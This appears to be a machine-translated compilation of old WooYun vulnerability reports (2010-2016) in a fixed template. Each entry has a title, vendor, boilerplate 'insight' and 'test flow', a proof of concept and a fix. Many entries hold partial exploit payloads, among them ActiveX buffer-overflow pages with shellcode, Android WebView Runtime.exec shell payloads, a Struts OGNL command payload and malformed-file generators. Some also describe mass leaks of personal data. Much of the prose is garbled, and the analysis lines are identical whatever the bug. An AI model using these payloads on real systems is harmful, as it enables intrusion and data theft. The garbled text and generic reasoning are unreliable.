**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: test version:2.5.1androidversion:4.1.2

**POC**: test version:2.5.1androidversion:4.1.2

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-094767] a certain e-commercegroupa certain translated textpacketlatest versioncodeexecution vulnerability(hasenvironmenttextrestriction)
**Vendor**: a certain e-commerce platform | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain translated textpacketandroid latest versiontextfornofilterandroidsystemselfaddwebviewremote code executioninterface,whentranslated textfunctionalityafter,texttalkback,clockback,QueryBacketc.,systemwilladdtwo peoplewebviewremote code executioninterface,as shown below.usertextpage--serviceprotocolpagetextlog inafterotherusedwebviewpagetextallnofilterthese twointerface.thistextfunctionalityisasthatsometextortextnottextallusertextservice.translated textfortextwilltranslated text,whenbehijackafterthencancaninusermobile phoneinstalltrojansetc.

**POC**: poc:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: canuseremoveJavascriptInterfacethisAPItext.textversioniftextlow,for exampleandroid 10 ,insidetextwebvierwnoremoveJavascriptInterfacethismethod.canadopttextcallmethod.public void removeUnsafeJSInteface
---

---
### [wooyun-2015-099762] onalsosecuritiestranslated textIEplugincancausingtextlocaldirectorywrite file
**Vendor**: onalsosecuritiestranslated text | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onalsosecuritiestranslated textIEplugincancausingtextlocaldirectorywrite filePkiCom5 IEplugintextinterfacecancausingmaliciousattackertextuserlocaldirectorywrite file,itsinoneinterfacetext,cancontroltextcontent,canoverwritetexthasfile.

**POC**: https://example.com/[redacted] IEplugin,theninremoteserverinhtmlincallhasissueinterfacetextuserlocaldirectorywrite file.<html>Test Exploit page<object classid='clsid:A42B0EC0-F064-485F-81D4-CE42105E8E42' id='target' ></object><script language='javascript'>//document.write(target.OwriteFile(

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0160366] translated textJavadeserializationvulnerability(Weblogic)
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2015 | **Type**: successintrusion incident

**Meta-thinking**: Trigger signal: functional testing

**Insight**: successintrusion incident lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify successintrusion incident-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: texttois**.**.**.**checkoneunderishttp://**.**.**.**/texttoaftertestunder,texttotextsuccess

**POC**: directlygetshell.pointtoastext,asonetextsecuritynetworktext.

**Bypass**: Direct exploitation

**Fix**: thisItextdo not know.
---

---
### [wooyun-2013-035965] Nationaltranslated textofsixa subsiteremote code execution
**Vendor**: a certain translated text | **Year**: 2013 | **Type**:

**Meta-thinking**: Trigger signal: functional testing

**Insight**:  lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify -related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: https://example.com/[redacted]]{'whoami',''})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2011-01922] a certain telecom operatormobile phonetextpasswordcontrolremoteoverflowvulnerability
**Vendor**: a certain telecom operator | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textpasswordcontrolcmpaySSClient.ocxinterfacehasoverflowvulnerabilitycanexecute arbitrarycode,testcode is as follows:<object classid='clsid:C15DDF55-9AE3-490A-A6F5-E63020698D5C' id='obj' ></object>var arg;arg=Array(10240);obj.BHBEncodeAmount(arg);

**POC**: testfileversionnumber: [IP redacted]inXPSP3andIE6intest, useWinDbgenterlinetext<object classid='clsid:C15DDF55-9AE3-490A-A6F5-E63020698D5C' id='obj' ></object>var arg;arg="";for (i=0; i<1024*2+8+4; i++) arg+="A";arg += "PPPP";for (i=0; i<1024*8; i++) arg+="C";obj.BHBEncodeAmount(arg);

**Bypass**: Direct exploitation

**Fix**: inuse_strncpyfunctiontextlengthParameterstextvalue,shouldusetargetbufferastext peoplenumberParameters,textcodeintextusetranslated textlengthastext peoplenumberParametersthisasforfunctionusetexthandletextnottextcausing,hasmultiple locationsusestrncpyfunctiontranslated texthassecuritytext.
---

---
### [wooyun-2013-021185] leapftpbuffer overflowcodeexecution vulnerability
**Vendor**: LeapWare | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textfornotforserveraddresstexthastextvalidation,wheninputmaliciousaddresslinktext,causingcodeexecution vulnerability

**POC**: modifyconfig.xmlcontentasas followsdata:0x3C, 0x6B, 0x65, 0x65, 0x70, 0x61, 0x6C, 0x69,0x76, 0x65, 0x3E, 0x0D, 0x0A, 0x09, 0x3C, 0x63,0x6D, 0x64, 0x20, 0x6E, 0x61, 0x6D, 0x65, 0x3D,0x22, 0x4C, 0x49, 0x53, 0x54, 0x22, 0x20, 0x2F,0x3E, 0x0D, 0x0A, 0x09, 0x3C, 0x63, 0x6D, 0x64,0x20, 0x6E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0141355] a certain textcantranslated textAppvulnerabilitycancausingberemotecontrol(textsametranslated textinside)
**Vendor**: a certain communications equipment vendor | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: for convenienceusercontroltranslated text,a certain communicationsVendortextsenda certain communicationsVendortexthearttextapp,usercaninstallinmobile phoneonthroughtextcomecontroltranslated text,texthandletranslated textallfunctionalityallcanthroughthisappcometext.throughforthisappsendtextnetworkdatapacketenterlineanalysisuseandtexta certain textcantranslated textinsidetextremotecontroladmin backendserviceprograminstallpacketRemoteServer.apkgetthisapkfortextremotecontrolmethod,translated textselftranslated text,againtranslated textfunctionalitycantextfortranslated textremotecontrolandremoteinstall,startapp(attackertextandtranslated textinsameonetranslated textinside).andthroughtextsimulationsendtextdatapackettextfora certain communicationsVendortextremotecontrol

**POC**: https://**.**.**.**/s/yayrap2xhr9oxxz/V41020-132051.mp4?dl=0(astextnottextmp4format)sendtextcontroltranslated textcontrolCode = {"home":3,"back":4,"up":19,"left":21,"right":22,"down":20,"menu":82,"volumedown":25,"volumeup":24,"enter":23,"numKey":8,"num1":9,"num2":10,"num3":11,"power":26}def sendCtrlKeycodeToHW(tvboxIp , keycode)

**Bypass**: Direct exploitation

**Fix**: intranslated textaddtextauthenticationtext,for exampleintranslated textauthenticationcodethentranslated textappuserinputuseauthenticationorencrypttranslated textsendtextcontroltext
---

---
### [wooyun-2013-037838] a certain mobile phonebrowserremote code execution vulnerability(latest versioncopynotFix)
**Vendor**: a certain security vendor | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: usedrops.wooyun.orgtestcode,ina certain textmobile phone360browseronopen:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textdo not knowtext...
---

---
### [wooyun-2012-014586] Androidtextusetranslated textcanbeexploit
**Vendor**: translated text | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: www.yytingting.comtextAndroidhastranslated textsoftware"translated text",intranslated textnonumbertextnamed,textnotextauthentication,ifbearptext,orDNShijacketc.,canbeexploitcomereplacetextotherapk,textcancantexttoremote code executionaftertext.

**POC**: step1. textputandroidcapture packetsenvironmenttextgood.textthissoftwaretranslated textcheckaddressas:https://example.com/[redacted] textquestionthispagetextreturncontent,largetextcantext58aslatest versioncopynumber,usecomeandtexthasversiontext.undertextasnew versiondownloadaddress.foristext,throughDNShijacketc.translated textreturnpage,putAPKreplacetextwetexttrojans,then cansuccess.step3. usea certain Internet companyinstallpacketcometestcanlook atto,textdownloadtextafter,parttextisa certain Internet companyinstallpacket.exploitsuccess.

**Bypass**: Direct exploitation

**Fix**: 1. softwaretranslated textgoodusetextnamed2. translated textgoodencrypt
---

---
### [wooyun-2012-07551] 118114remote code execution
**Vendor**: 118114 | **Year**: 2012 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: http://[IP redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: https://example.com/[redacted]
---

---
### [wooyun-2015-0160386] translated textonalsotranslated texta systemjavadeserializationexecution vulnerabilityadministrator privileges
**Vendor**: translated textonalsotranslated text | **Year**: 2015 | **Type**: successintrusion incident

**Meta-thinking**: Trigger signal: functional testing

**Insight**: successintrusion incident lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify successintrusion incident-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: http://**.**.**.**:7001/defaultroot/login.jsp

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0103484] hudsontextusevulnerabilitycancausingtextcodeleakageusetranslated textas an exampleleakageNtextsensitivecode
**Vendor**: hudson | **Year**: 2015 | **Type**: unauthorized access

**Meta-thinking**: Trigger signal: functional testing

**Insight**: unauthorized access lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify unauthorized access-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onetexttypevulnerabilityHudsonexploitmethod,notusetextpassword,notusecode execution,directlychecklook atarbitrarycode.1. textquestionhudsonhomepage2. textquestionitemspagetextquestionnottotextcode3. weaftertextdirectlyaddtext/ws/then cantextquestionanddownloadallcodehttp://[IP redacted]

**POC**: onetexttypevulnerabilityHudsonexploitmethod,notusetextpassword,notusecode execution,directlychecklook atarbitrarycode.1. textquestionhudsonhomepage2. textquestionitemspagetextquestionnottotextcode3. weaftertextdirectlyaddtext/ws/then cantextquestionanddownloadallcodehttp://[IP redacted]

**Bypass**: Direct exploitation

**Fix**: addpermissions
---

---
### [wooyun-2013-039061] textpointsoftwarealltextproducttexthasgeneric remote code execution
**Vendor**: a certain softwarecompany | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]  textusetranslated texthttptranslated text:</div><div class="login_index_kj"><div class="l

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0168774] a provincialtextsecurityelectronictextinformationsystemhassecurityvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textsecurityelectronictextinformationsystem:**.**.**.**:81/login.html?method=loginweblogicdeserialization

**POC**: canchecklook atandmodifyarbitrary files.

**Bypass**: Direct exploitation

**Fix**: upgrade.
---

---
### [wooyun-2013-039543] 4R-ITtextsystemhastextusetextremote code execution
**Vendor**: a certain textcompany | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: searchtext:baidu:4RExecutiontranslated textplatformbdidu:login!toLogin.actionnetworktext:https://example.com/[redacted] class="down"><div class="login"><div class="login-in" style="padding-top: 50px;"><table id="__02" border="0" cellpadding="0" cellspacing="0" style="margin:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-098187] a certain textmobile phonetextbrowsercross-domainscriptexecution vulnerability(withpoc)
**Vendor**: a certain communications equipment vendor | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: <body><script>frame = document.body.appendChild(document.createElement("iframe"));frame.src = "https://example.com/[redacted]";frame.onload = function() {Function("}, (builtins = this), function() {");originalInstantiate = builtins.Instantiate;builtins.DefineOneShotAccessor(builtins, "Instantiate", function(

**Bypass**: Direct exploitation

**Fix**: forbuiltinsobjectExecutionscriptenterlinerestriction
---

---
### [wooyun-2014-061144] textremote code execution vulnerability
**Vendor**: a certain texttechnology company | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: reference:https://example.com/[redacted] execute(cmdArgs){return aobj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: see:https://example.com/[redacted]
---

---
### [wooyun-2013-039430] textsecuritybrowserDLLhijackvulnerability
**Vendor**: RiSing | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textsecuritybrowser2.0latest version,officialdownloadinstall versionsrse.exe,windows xp sp4environment,textsecuritybrowsertextprogramwebsrv.exe(version1.0.2.73)inruntextwillloadtwo peoplenottextpathcookiecomp.dllandDownloadmgr.dllfile(twofilenotranslated textsecuritybrowseronetogetherinstall),causingmaliciousattackercantextthisDLLfileuseforhijack,textuseropenremotefilefolderunderwebpageorputmaliciousDLLfiletextwebpagefiletextsamepackagesendtextusertextuseropenwebpage,causingremote code execution.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: translated textcheckDLLfileload.
---

---
### [wooyun-2014-066840] textbrowserremote code execution vulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: downloadtextbrowserhttps://example.com/[redacted]

**POC**: searchJSinterfaceexploitJSinterfaceconstructonewrite file+popupExp:<html><head><title>test</title></head><body><script>function execute(testcmd){return JSinterface.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'WooYun_TEST.' > /s

**Bypass**: Direct exploitation

**Fix**: :)
---

---
### [wooyun-2015-0158832] texta certain sitehasJAVAdeserializationvulnerability
**Vendor**: allinpay.com | **Year**: 2015 | **Type**: network design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: network design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify network design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: texta certain sitehasJAVAdeserializationvulnerabilityaddress:[IP redacted]

**POC**: texta certain sitehasJAVAdeserializationvulnerabilityaddress:[IP redacted]

**Bypass**: Direct exploitation

**Fix**: textofficialFixPatch
---

---
### [wooyun-2012-07467] a certain social platforma certain social platformclick to openfriendmessage execute local files and commands
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textnottext,texta certain Internet company/TMonetext

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-071456] textbrowserhascross-domainvulnerability
**Vendor**: a certain softwareVendor | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textmobile phonebrowser,latest version

**POC**: payload<body><script>i = document.body.appendChild(document.createElement("iframe"));i.src = "https://example.com/[redacted]";i.onload = function(){document.documentURI = "javascript://hostname.com/%0D%0Aalert('Hello ' + location)";i.contentWindow.location = "";}</script></body>

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-040476] #2 Sinfor CSProxy ActiveX Remote Code Execution
**Vendor**: a certain security vendor | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: namedname:         CSProxy Classsendlinetext:        Sinfor Technologies  Co.,LtdType:         ActiveX controlversion:         4. 2. 1. 3filetext:on timestextquestiontext:     2013text10text21text,0:27text ID:       {53EC2F48-968E-4A42-B99B-9F6571474213}usecount:       40text timesnumber:       0file:         ProxyIE.dllfilefolder:        C:\Program Files\Sinfor\SSL\ClientComponentException Code: ACCESS_VIOLATIONDisasm: 77BA6F29	MOV [EDI],EDX	(msvcrt.dll)Seh Chain:------------------

**POC**: <html><body><object classid="clsid:53EC2F48-968E-4A42-B99B-9F6571474213"id="target"></object><input type="button" onclick="test()" value="test" /><script>function test(){var shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+'%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd0

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-071422] DSbrowserhas remote code execution vulnerability
**Vendor**: cncertNationaltranslated textinheart | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: DSbrowserisonalsotranslated textsendproductlatest version

**POC**: hasvulnerabilitypayload<html><head><title>test</title></head><body><script>function execute(testcmd) { return JsSendToken.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd); } try{ execute(["/system/bin/sh","-c","echo 'Webviewremotecommandexecution vulnerabilitytest.' > /sdcard/WooYun.txt"])

**Bypass**: Direct exploitation

**Fix**: null
---

---
### [wooyun-2011-02530] a certain search enginebrowserremote code execution vulnerability
**Vendor**: a certain search engine | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain search enginebrowserdatabasefilehastextissue,causingonelowtextDLLdatabaseloadtext,ifputa certain search enginebrowsersetaswindowstextbrowser,putcausingoneremote code execution vulnerability.

**POC**: frameworkproxy.dlltexthtmlfileputsameonedirectory,remoteUNCpathrun.

**Bypass**: Direct exploitation

**Fix**: reference:https://example.com/[redacted]
---

---
### [wooyun-2010-0366] Guotai JunansecuritiesFutong page trading security controlremoteoverflowvulnerability[2]
**Vendor**: Guotai Junan | **Year**: 2010 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: file:ssoLib.dllversion:[IP redacted]clsid:FAC87377-9586-4C72-A614-8C9B3CA1BF5Bproperty:GetCurrentToken

**POC**: POC or exploit translated text phpsec@hotmail.com text

**Bypass**: Direct exploitation

**Fix**: recommendtextsendtranslated textcheckcode,nottext timesinsameoneissueontext
---

---
### [wooyun-2015-092992] a certain textAPPremote code execution vulnerability
**Vendor**: a certain portal site | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain textAPPAndroidtextexport2 peoplejsinterface,cancausingremote code execution vulnerability

**POC**: intextone locationtranslated textundercomment,commentismaliciouslinkopenthen cancauseremote code executionattack

**Bypass**: Direct exploitation

**Fix**: addJavascriptInterfacehastextremote code execution vulnerability,translated textuse,API 17inuse@JavascriptInterface textaddjavascriptInterface;textsystemwebkitinsidetranslated textinterfacesearchBoxJavaBridge_,accessibility,a
---

---
### [wooyun-2016-0195710] a certain vulnerabilitytextnationwidenumbertextsecurities industrytextpersonnelinformation/canchecktextsecuritiescompanytextinformation
**Vendor**: intextsecuritiestextwill | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onlychecktextnumbertextprove vulnerability,notextdatabase,nottextcheckItextintextsecuritiestextwillthiswebsitehasweblogic JAVAdeserializationvulnerabilityhttp://[IP redacted]intextsecuritiestextwillwebsitetexthasseveralIPshouldtextisuseweblogicintext,textonlytextHTTPservice,unable toexploitJAVAdeserializationvulnerability124.127.51.156,[IP redacted],[IP redacted],[IP redacted],[IP redacted]hosttexttoIPcancanisFixtext,textFix.hosttexttoIPhasseveralsystemconnectserverconnectdatadatabase800manytext1000Wtranslated textinformation,textItextnamed,ID numbertextID numbertextunder,29Wtextistextinformation,400Wtextnamed,textsingletext,text,ID number,mobile phonenumber,textphone,emailtextID numbertextunder,textis400Wtranslated text180Wtranslated textistranslated texthas160Wtranslated textpersonnelinformation,textnamed,textsingletext,text,ID number,

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: apply patchcanreference:FixweblogicJAVAdeserializationvulnerabilitytextmethodhttps://example.com/[redacted]
---

---
### [wooyun-2013-036096] a certain IM softwareandroidclientlatest versionremote code execution(canremotetextaftertextcontroluser)
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text:https://example.com/[redacted] 4.5.1a certain Internet companytextquestion:https://example.com/[redacted] JsApi hasissuetextquestion:https://example.com/[redacted]

**POC**: see detailed descriptiontextquestionpocURLExecutioncommandtext peoplexxxfile

**Bypass**: Direct exploitation

**Fix**: youtext
---

---
### [wooyun-2013-028341] Ktranslated textofficialservera certain vulnerabilitycancausingnumbertextKtranslated textuserdataleakage
**Vendor**: okehero.com | **Year**: 2013 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Strutstextvulnerabilityfriendortextmobile phonewilltext peopleKtranslated textKtext.forischeckunder,texthastextvulnerabilityusertextlarge,translated text,thisInotusetext.text peopletext.textofficialtextandtranslated text,texthas,rewardhastext,textistextvulnerability,buttranslated textpatch.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: youhastranslated text.
---

---
### [wooyun-2012-015872] translated textfileheap overflow
**Vendor**: a certain search engine | **Year**: 2012 | **Type**: denial of service

**Meta-thinking**: Trigger signal: functional testing

**Insight**: denial of service lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify denial of service-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text6.1.0inreadtextfiletext,nottranslated textfilenamedlength,causingheap overflowCall Stack:0x7C920000[1240B] ntdll.dll: stricmp[+F7](3475,2069728,3475,16121856)0x7C920000[125C3] ntdll.dll: stricmp[+2AF](18849792,24576,3475,0)0x7C920000[109BA] ntdll.dll: wcsncpy[+43B](16121856,0,18846952,0)0x00400000[1AD6C3] TTPlayer.exe: (18846952,5343191,18846952,18742704)0x00400000[3E19] TTPlayer.exe: (1239860,18846964,18816740,1239420)0x00400000[117BA3] TT

**POC**: translated text6.1.0textfileaszipformat.textafterputitsinSkin.xmlopen,modifyfieldvalueastranslated text.afterintranslated textintext,then cantriggertext

**Bypass**: Direct exploitation

**Fix**: fortextfiletranslated text,andforfieldlengthtextcheck
---

---
### [wooyun-2016-0191623] a certain ITservicecompanytenconsoleservercompromised/translated textitemsinformation/alltranslated textpersonalinformation/translated text/SVN/emailleakage
**Vendor**: a certain ITservicecompany | **Year**: 2016 | **Type**:

**Meta-thinking**: Trigger signal: functional testing

**Insight**:  lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify -related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text,onlychecktextdataprove vulnerability,nottextcheckItranslated textlook atoneundercancontrolservertext,alltextcanexploitJAVAdeserializationvulnerabilitycontrol.textandgoodtextgoodtextuse,goodtextgoodtextdatadatabase...1-infothisconsolehasgoodtextcantextusecantextquestionconnectservertextgoodtextusegoodtextdatadatabaseinformationconnectdatadatabasegoodtextuser,too lazy totexthashow manytextlook atlook at92Wtranslated textitemsinformation84Wtranslated textitemsinformation72Wtranslated textitemsinformation59Wtextinformation,shouldistextpackettranslated textallhas17Wtranslated texthasgoodtextinformation,too lazy tooneonelook ata certain Internet companyuseremailthisistranslated text,texthasgoodtextandtranslated text,nottranslated textlook atlook at5Wemailtexthasgoodtext,textalltextnottextthisshouldistranslated textinformation,1.5W,has names,phone,email,ID number...textisa certain Internet companyusertotextonedatadatabasenotsametranslated textpersonaltext,hasgoodtext,nottextdo not knowtextSVNgoodlargebackupfileherehasonesomeuserpasswordtexthasgoodtextdatadatabasecanlook at,too lazy tolook at,thistextNo.oneconsoleserver,tenconsoleallthis waylook attextIthennotusetext-.-aftertextsingleonepoint2-we

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: apply patchorreference:FixweblogicJAVAdeserializationvulnerabilitytextmethodhttps://example.com/[redacted]
---

---
### [wooyun-2015-0100071] a certain video sitePPStranslated textnotwhen(canhijackDLL)
**Vendor**: text | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain video sitePPS textandtextprogram(a certain video sitetextplayer)hasDLLhijackvulnerability!whenfiletextafter,runsuffixnamed*.qsv textputfiletext,cantriggersamedirectorymaliciouscode

**POC**: a certain video sitePPS textandtextprogram(a certain video sitetextplayer)hasDLLhijackvulnerability!whenfiletextafter,runsuffixnamed*.qsv textputfiletext,cantriggersamedirectorymaliciouscode

**Bypass**: Direct exploitation

**Fix**: textprogramtranslated textDLLtextpath
---

---
### [wooyun-2012-013408] a certain videoplayer3.7.892 m2pfileparseheaptextoverwritevulnerability
**Vendor**: a certain videoplayer | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain videoplayerlatest version(3.7.892)parseM2Pfiletexthasone locationheaptextoverwritevulnerability,cancausingtextputM2Pfiletextexecute arbitrarycodetexttestcode,textinXPontestthrough

**POC**: l = 3315716 * "A"s1 = ((0,'\x00\x00\x01\xba'), (2048, '\x00\x00\x01\xba'),(3289120, '\x00\x00\x01\xe0\x07'), (3289273, '\x00\x00\x01\xb3'),(3289283, '\xba'), (3289452, '\x42\x42\x42\x42'),(3289468, '\x00\x00\x01\x00'), (3290359, '\x00\x00\x01\x00'),(3301408, '\x00\x00\x01\xe0\x07'), (3303112, '\x00\

**Bypass**: Direct exploitation

**Fix**: no
---

---
### [wooyun-2013-043078] #4  Sangfor CSClientManager Activex Remote Code Execution bypass dep on ie8
**Vendor**: a certain security vendor | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
